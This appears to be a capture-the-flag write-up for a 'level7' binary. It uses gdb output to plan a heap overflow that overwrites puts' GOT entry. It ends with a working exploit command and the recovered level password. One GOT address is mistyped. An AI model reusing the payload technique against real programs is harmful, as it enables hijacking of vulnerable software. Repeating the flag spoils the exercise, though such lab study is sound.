@@ -1,0 +1,114 @@
+using gdb we get that the program has 2 functions
+main, m
+main takes two arguments and allocate them then copy them in other variables
+and then opens the path where the pass of level8 is then doesn't really print it for us
+but there is a puts function after it so we will use it to use GOT and redirect puts to the m function
+
+there are many functions called in main  but all we want is malloc, the strcpy and the puts function
+
+the idea is to check the offset between arg1 adn arg2 in the heap so we can execute the garbage in the first argument
+then in the second argument redirect to whatever address we want
+
+we will start by looking for the offset
+
+i used the command:
+---------------------------
+(gdb) r AAAA BBBB
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level7/level7 AAAA BBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
+---------------------------
+
+then i used:
+---------------------------
+(gdb) info proc mappings
+process 4338
+Mapped address spaces:
+
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
+	 0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
+	 0x804a000  0x806b000    0x21000        0x0 [heap]
+	0xb7e2b000 0xb7e2c000     0x1000        0x0
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0
+	0xb7fdb000 0xb7fdd000     0x2000        0x0
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+---------------------------
+
+as we see the start addr and the end addr of the heap are 0x804a000  0x806b000
+now we can look inside the heap and check AAAA and BBBB that are allocated:
+
+---------------------------
+(gdb) x/64wx 0x804a000
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
+0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
+0x804a040:	0x00000000	0x00020fc1	0xfbad240c	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000	0x00000000	0xb7fd1980
+0x804a080:	0xffffffff	0x00000000	0x00000000	0x00000000
+0x804a090:	0x0804a0e0	0xffffffff	0xffffffff	0x00000000
+0x804a0a0:	0x0804a0ec	0x00000000	0x00000000	0x00000000
+0x804a0b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0c0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0d0:	0x00000000	0x00000000	0x00000000	0xb7fd0a80
+0x804a0e0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a0f0:	0x00000000	0x00000000	0x00000000	0x00000000
+---------------------------
+
+as we can see the offset between AAAA and BBBB are 20
+so now we can use 20 character of gargage to get from argv1 to argv2
+
+so we will do 20 garbage + the address of GOT + the address of m
+
+we get m address using: 
+---------------------------
+(gdb) x/s m
+0x80484f4 <m>:	 "U\211\345\203\354\030\307\004$"
+---------------------------
+
+so m address is 080484f4
+
+now we need to get the GOT address:
+---------------------------
+(gdb) disas main
+.
+.
+.
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
+   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+   0x080485fc <+219>:	mov    eax,0x0
+   0x08048601 <+224>:	leave
+   0x08048602 <+225>:	ret
+End of assembler dump.
+(gdb)
+(gdb) disas 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:		jmp    DWORD PTR ds:0x8049928
+   0x08048406 <+6>:		push   0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+(gdb)
+---------------------------
+
+then the got address is 0x804992d8
+
+now we have the offset=20, we have the address of m=080484f4 then the address of GOT=0x8049928
+
+so as ususal with a small python scrpit we will manage this up:
+ > ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1637318212
